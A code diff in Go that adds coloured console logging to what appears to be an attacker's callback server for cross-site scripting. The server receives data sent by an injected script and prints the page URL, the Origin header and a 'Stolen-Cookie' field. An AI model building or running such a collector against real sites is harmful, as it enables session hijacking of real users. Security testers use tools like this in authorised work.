@@ -36,7 +36,7 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Add("Access-Control-Allow-Headers", "*")
 
 	fmt.Printf("\n\n  \u001b[30;102m[%s] Connected\u001b[0m\n", r.RemoteAddr)
-	fmt.Printf("%s %s%s\n", r.Method, r.Host, r.RequestURI)
+	fmt.Printf("\u001b[93m%s\u001b[0m \u001b[96m%s%s\u001b[0m\n", r.Method, r.Host, r.RequestURI)
 	for key, value := range r.Header {
 		fmt.Printf("\u001b[93m%s\u001b[0m: \u001b[96m%s\u001b[0m\n", key, strings.Join(value, ", "))
 	}
@@ -80,6 +80,8 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	if writeErr != nil {
 		log.Println("Writing error in callBackFromScript:", writeErr.Error())
 	}
+	fmt.Printf("\u001b[93mURL\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.URL)
+	fmt.Printf("\u001b[93mOrigin\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("Origin"), ", "))
 	fmt.Printf("\u001b[93mX-Forwarded-For\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("X-Forwarded-For"), ", "))
 	fmt.Printf("\u001b[93mStolen-Cookie\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.Cookie)
 
